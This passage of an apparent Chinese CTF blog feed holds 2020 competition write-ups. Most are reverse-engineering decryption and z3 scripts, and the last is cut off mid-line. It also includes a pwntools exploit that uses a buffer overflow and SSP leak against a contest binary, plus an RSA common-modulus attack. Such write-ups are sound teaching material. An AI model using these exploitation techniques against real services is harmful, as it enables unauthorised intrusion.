class="hljs-keyword">lambda</span> : <span class="hljs-literal">None</span>) <span class="hljs-keyword">for</span> __l[<span class="hljs-string">'arg'</span>] <span class="hljs-keyword">in</span> [arg] ][<span class="hljs-number">0</span>])({}), <span class="hljs-string">'check1'</span>)] ][<span class="hljs-number">0</span>]  <span class="hljs-keyword">for</span> __g[<span class="hljs-string">'check'</span>], check.__name** <span class="hljs-keyword">in</span> [(<span class="hljs-keyword">lambda</span> arg: (<span class="hljs-keyword">lambda</span> **l: [ <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, __l[<span class="hljs-string">'arg'</span>])) <span class="hljs-keyword">for</span> __l[<span class="hljs-string">'arg'</span>] <span class="hljs-keyword">in</span> [arg] ][<span class="hljs-number">0</span>])({}), <span class="hljs-string">'check'</span>)] ][<span class="hljs-number">0</span>])(<span class="hljs-built_in">globals</span>(), __<span class="hljs-keyword">import</span>**(<span class="hljs-string">'**builtin**'</span>, level=<span class="hljs-number">0</span>).**<span class="hljs-built_in">dict</span>**[<span class="hljs-string">'print'</span>]) </span><br></pre></td></tr></tbody></table></figure><p>代码可读性很差，但是可以大概了解一下信息，一共输入81位，某些特定的位数上的数字是确定的，其中定义了一些变量，可以很轻易看出来分别是行、列和九宫格，两个check也很清晰，查每行每列每个九宫格有无重复数字，查和是否为45，这很显然是一个数独，直接解就可以了。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-ciscn 西北赛区分区赛</title>
      <link href="/2020/09/19/2020-09-19-2020-ciscn_%E8%A5%BF%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
      <url>/2020/09/19/2020-09-19-2020-ciscn_%E8%A5%BF%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>2020-ciscn 西北赛区分区赛</p><span id="more"></span><h2 id="Lua-magic"><a href="#Lua-magic" class="headerlink" title="Lua_magic"></a>Lua_magic</h2><p>程序先读取了一个lua脚本，跑三次循环，每次输入两个数，根据这两个数算出一个新的数字和生成的随机数比较，如果相同进行下一次验证，不同直接退出<br>Random函数在之前没有设置种子，所以是个伪随机数，所以只需要知道运算的过程就可以了，但是一开始没有给lua文件，只能盲打，输入几个数字之后发现，第一个数来选择用于运算的数，然后和第二个数异或，得到最终的结果，先在linux环境下写个程序生成随机数<br>默认第一个数输入0，根据异或出来的结果构造三个数字，绕过前面的检验，但是最后读入flag文件之后没有输出，最后一个read存在溢出，开启了cannary保护，直接利用ssp输出flag值</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">localfile = <span class="hljs-string">"./Lua_magic"</span></span><br><span class="line">locallibc = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remotelibc = locallibc</span><br><span class="line">local = <span class="hljs-literal">False</span></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">    io = process(localfile)</span><br><span class="line">    libc = ELF(locallibc)</span><br><span class="line">    elf = ELF(localfile)</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    io = remote(<span class="hljs-string">'172.1.13.17'</span>, <span class="hljs-number">8888</span>)</span><br><span class="line">    libc = ELF(remotelibc)</span><br><span class="line">    elf = ELF(localfile)</span><br><span class="line"><span class="hljs-comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se = <span class="hljs-keyword">lambda</span> data: io.send(data)</span><br><span class="line">sa = <span class="hljs-keyword">lambda</span> delim, data: io.sendafter(delim, data)</span><br><span class="line">sl = <span class="hljs-keyword">lambda</span> data: io.sendline(data)</span><br><span class="line">sla = <span class="hljs-keyword">lambda</span> delim, data: io.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="hljs-keyword">lambda</span> delim, data: io.sendafter(delim, data)</span><br><span class="line">rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>: io.recv(numb)</span><br><span class="line">ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>: io.recvuntil(delims, drop)</span><br><span class="line">info_addr = <span class="hljs-keyword">lambda</span> tag, addr: io.info(tag + <span class="hljs-string">': {:#x}'</span>.<span class="hljs-built_in">format</span>(addr))</span><br><span class="line">uu32 = <span class="hljs-keyword">lambda</span> data: u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))</span><br><span class="line">uu64 = <span class="hljs-keyword">lambda</span> data: u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">''</span></span>):</span></span><br><span class="line">    gdb.attach(io, cmd)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># info</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># gadget</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># rop</span></span><br><span class="line">io=remote(<span class="hljs-string">"172.1.13.17"</span>,<span class="hljs-number">8888</span>)</span><br><span class="line">ru(<span class="hljs-string">"heart;)\n"</span>)</span><br><span class="line">sl(<span class="hljs-string">"0 1808823121"</span>)</span><br><span class="line">ru(<span class="hljs-string">"who am I?\n"</span>)</span><br><span class="line"><span class="hljs-built_in">print</span> io.recv()</span><br><span class="line">sl(<span class="hljs-string">"0 840963568"</span>)</span><br><span class="line">ru(<span class="hljs-string">"who am I?\n"</span>)</span><br><span class="line"><span class="hljs-built_in">print</span> io.recv()</span><br><span class="line">sl(<span class="hljs-string">"0 1684516447"</span>)</span><br><span class="line">ru(<span class="hljs-string">"who am I?\n"</span>)</span><br><span class="line"><span class="hljs-built_in">print</span> io.recv()</span><br><span class="line">sl(p64(<span class="hljs-number">0x602140</span>)*<span class="hljs-number">35</span>)</span><br><span class="line"><span class="hljs-built_in">print</span> io.recv()</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#debug('b *0x0000000000400766')</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="Gameover"><a href="#Gameover" class="headerlink" title="Gameover"></a>Gameover</h2><p>先读取随机数，然后转换成了16进制字符串，之后列出菜单<br>输入选项，1是查看密文，7是最后一步验证，其他的字符都是进行一步输入，绕过最后一步验证之后就可以拿到shell，最后一个验证比较开始读取的随机数和最后一次输入是否相同<br>中间加密过程进行了一些大数运算，关键运算在于BN_mod_exp，表示(v13**v12) mod v11，其中v11是中间一串大数，尝试分解发现很难分解，猜测是大素数之积，v13是我们需要知道的随机数也就是明文，整个加密的过程就是rsa，这里发现，因为同在bss段上，可以利用菜单2的输入覆盖掉v12的值，也就是构造相同m、相同n、不同e生成的两条密文，存在共模攻击，可以直接算出明文也就是最后需要的输入</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-DDCTF</title>
      <link href="/2020/09/08/2020-09-08-2020-DDCTF/"/>
      <url>/2020/09/08/2020-09-08-2020-DDCTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这次re全是安卓，后面两题连脱壳的环境都没搭好……</p><span id="more"></span><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>安卓逆向，但是没加壳，很容易找到判断的逻辑，两层加密最后经过一层md5，后来更新提示把md5之前的结果给出来了，就很好逆了。</p><p>整个程序流程是一个AES加密之后进行XXTEA加密，只是AES的S盒经过了处理，逆回来就可以发现是AES的S盒，直接上脚本解密就好了。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line">_DELTA = <span class="hljs-number">0x9E3779B9</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt_xxtea</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> == <span class="hljs-string">''</span>: <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span></span><br><span class="line">    v = <span class="hljs-built_in">str</span></span><br><span class="line">    k = [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]</span><br><span class="line">    n = <span class="hljs-built_in">len</span>(v) - <span class="hljs-number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="hljs-number">0</span>]</span><br><span class="line">    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // (n + <span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-built_in">sum</span> = (q * _DELTA) &amp;amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">sum</span> != <span class="hljs-number">0</span>):</span><br><span class="line">        e = <span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span> &amp;amp; <span class="hljs-number">3</span></span><br><span class="line">        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">            z = v[p - <span class="hljs-number">1</span>]</span><br><span class="line">            v[p] = (v[p] - ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &amp;lt;&amp;lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &amp;lt;&amp;lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[p &amp;amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp;amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        z = v[n]</span><br><span class="line">        v[<span class="hljs-number">0</span>] = (v[<span class="hljs-number">0</span>] - ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &amp;lt;&amp;lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &amp;lt;&amp;lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[<span class="hljs-number">0</span> &amp;amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp;amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line">        y = v[<span class="hljs-number">0</span>]</span><br><span class="line">        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> - _DELTA) &amp;amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line">    <span class="hljs-keyword">return</span> v</span><br><span class="line"></span><br><span class="line">t = [<span class="hljs-number">0x15ef75f4</span>, <span class="hljs-number">0xc4277b7a</span>, <span class="hljs-number">0xe7f4412d</span>, <span class="hljs-number">0x78e78345</span>, <span class="hljs-number">0xecf16de2</span>, <span class="hljs-number">0xd5d29477</span>, <span class="hljs-number">0x2169b3a0</span>, <span class="hljs-number">0x2a685baa</span>]</span><br><span class="line">target = decrypt_xxtea(t)</span><br><span class="line">s = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">    tmp = <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>, <span class="hljs-string">'0'</span>)</span><br><span class="line">    s += tmp[-<span class="hljs-number">2</span>:]</span><br><span class="line">    s += tmp[-<span class="hljs-number">4</span>:-<span class="hljs-number">2</span>]</span><br><span class="line">    s += tmp[-<span class="hljs-number">6</span>:-<span class="hljs-number">4</span>]</span><br><span class="line">    s += tmp[-<span class="hljs-number">8</span>:-<span class="hljs-number">6</span>]</span><br><span class="line">s = s.encode()</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">text</span>):</span></span><br><span class="line">    key = <span class="hljs-string">b"1234567890123456"</span></span><br><span class="line">    <span class="hljs-comment"># iv = b"\x9d\x25\xdd\xe0\xc1\x37\x86\x21\x32\xec\x0c\x32\x4c\xfb\xf0\x46"</span></span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    cryptos = AES.new(key, mode)</span><br><span class="line">    plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">    <span class="hljs-keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line">d = decrypt(s)</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">"解密:"</span>, d)</span><br><span class="line"><span class="hljs-comment"># 解密: b'DDCTF{qazasd1234$}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br></pre></td></tr></tbody></table></figure><p>得到flag</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-钓鱼城杯-wp</title>
      <link href="/2020/08/28/2020-08-28-2020-%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-wp/"/>
      <url>/2020/08/28/2020-08-28-2020-%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>2020-钓鱼城杯</p><span id="more"></span><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h2><p>打开程序发现调用方式很奇怪，调试直接运行然后暂停通过stack trace找到输入函数，以宽字符输入然后处理成字符串，接着生成了两串数据，在这里绕了很久，总在找生成逻辑，实际上生成的数和输入没有关系，每次运行都会生成同样的数</p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e<span class="hljs-number">3</span>dfb<span class="hljs-number">24</span>a<span class="hljs-number">5553</span>edac<span class="hljs-number">13</span>ff<span class="hljs-number">65</span>ac<span class="hljs-number">7</span>b<span class="hljs-number">5</span>f<span class="hljs-number">3170</span> </span><br><span class="line"><span class="hljs-number">9</span>d<span class="hljs-number">25</span>dde<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">137862132</span>ec<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">324</span>cfbf<span class="hljs-number">046</span></span><br></pre></td></tr></tbody></table></figure><p>发现之后接着调试，程序调用了wincrypt的API用来加密，根据传入的数据查到AES加密，整个程序的逻辑为，用生成的两串数作为iv和key，输入作为明文，输出经过base64编码之后显示到终端并写入到文件里，所以直接解密即可</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_to_16</span>(<span class="hljs-params">text</span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text.encode(<span class="hljs-string">'utf-8'</span>)) % <span class="hljs-number">16</span>:</span><br><span class="line">        add = <span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(text.encode(<span class="hljs-string">'utf-8'</span>)) % <span class="hljs-number">16</span>)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        add = <span class="hljs-number">0</span></span><br><span class="line">    text = text + (<span class="hljs-string">'\0'</span> * add)</span><br><span class="line">    <span class="hljs-keyword">return</span> text.encode(<span class="hljs-string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">text</span>):</span></span><br><span class="line">    key = <span class="hljs-string">b"\xe3\xdf\xb2\x4a\x55\x53\xed\xac\x13\xff\x65\xac\x7b\x5f\x31\x70"</span></span><br><span class="line">    iv = <span class="hljs-string">b"\x9d\x25\xdd\xe0\xc1\x37\x86\x21\x32\xec\x0c\x32\x4c\xfb\xf0\x46"</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">    <span class="hljs-keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    d = decrypt(</span><br><span class="line">        <span class="hljs-string">b"F10014173233C3482DACB7915297AC89E45781087077C39F4F00C832B6C12DA6D2C75E4133CE84FB6440B10FD124A72A"</span>)</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"解密:"</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># b'flag{this_flag_not_beyr_f81_8837fu8}\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c'</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-强网杯-wp</title>
      <link href="/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/"/>
      <url>/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>赛题出的很有水平啊，第一天出去玩了一天，第二天才开始做，只做出了这么几题，看了一下firmware是个虚拟机，再多点时间应该也可以出</p><span id="more"></span><h2 id="侧防"><a href="#侧防" class="headerlink" title="侧防"></a>侧防</h2><p>这题比较简单，放在了，没有放在re分类，直接上脚本</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">byte_4010 = [<span class="hljs-number">0x51</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x73</span>]</span><br><span class="line">target = <span class="hljs-string">"Lx|dTUwe\\IvNhCBOLqDNfW}ImFZCtiyxO\\PW^ebD"</span></span><br><span class="line">f = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(target), <span class="hljs-number">4</span>):</span><br><span class="line">   f.append(target[i + <span class="hljs-number">1</span>])</span><br><span class="line">   f.append(target[i + <span class="hljs-number">2</span>])</span><br><span class="line">   f.append(target[i + <span class="hljs-number">3</span>])</span><br><span class="line">   f.append(target[i])</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(f):</span><br><span class="line">   flag += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-number">65</span>) ^ byte_4010[i % <span class="hljs-number">7</span>])</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># flag{QWB_water_problem_give_you_the_score}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="xx-warmup-obf"><a href="#xx-warmup-obf" class="headerlink" title="xx_warmup_obf"></a>xx_warmup_obf</h2><p>混淆+花指令+反调，从read或者strlen函数开始找起会比较方便，找到之后发现一位一位计算，为了节省时间，代码跑出一部分之后后面的flag可以直接猜出来</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RecurOr</span>(<span class="hljs-params">flags, models, pos=<span class="hljs-number">0</span></span>):</span></span><br><span class="line">   <span class="hljs-keyword">if</span> pos &lt;= <span class="hljs-built_in">len</span>(flags) - <span class="hljs-number">1</span>:</span><br><span class="line">       <span class="hljs-keyword">return</span> Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + <span class="hljs-number">1</span>))</span><br><span class="line">   <span class="hljs-keyword">else</span>:</span><br><span class="line">       <span class="hljs-keyword">return</span> Or(models[flags[pos]] != flags[pos])</span><br><span class="line"></span><br><span class="line">f = [BitVec(<span class="hljs-string">'v%d'</span> % i, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>)]</span><br><span class="line">flag = []</span><br><span class="line">solver = Solver()</span><br><span class="line"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> f:</span><br><span class="line">   solver.add(c &gt;= <span class="hljs-number">0x0</span>)</span><br><span class="line">   solver.add(c &lt;= <span class="hljs-number">0xff</span>)</span><br><span class="line">solver.add(f[<span class="hljs-number">0</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">'f'</span>))</span><br><span class="line">solver.add(f[<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">'l'</span>))</span><br><span class="line">solver.add(f[<span class="hljs-number">2</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">'a'</span>))</span><br><span class="line">solver.add(f[<span class="hljs-number">3</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">'g'</span>))</span><br><span class="line">solver.add(f[<span class="hljs-number">4</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">'{'</span>))</span><br><span class="line">solver.add((f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x1eb9d</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x40a8c</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x3fb3f</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xfffb82cd</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xffffea88</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0xfffda7c3</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xc78321</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0xfffd185d</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xfffe032d</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0xfffc468a</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0xFFFC0EA3</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFE5277</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xfffc4328</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x44DE</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xF961DAEB</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x35770</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x1CC39</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x4851</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0xFFFFE5B9</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0x36D92</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFCF9E1</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x37C38</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x4186D</span>)&amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0x4B202E4</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0xFFFC4AB1</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x0CB64</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x1309E</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0xFFFB995E</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0x2E940</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFEB612</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0xFFFC631A</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0xFFFCAA83</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0x16A0C</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFCDE9AB5</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x37EB9</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFDD238</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0xFFFBE2C0</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x17977</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0x29D39</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFBB74E</span> + f[<span class="hljs-number">0</span>] * <span 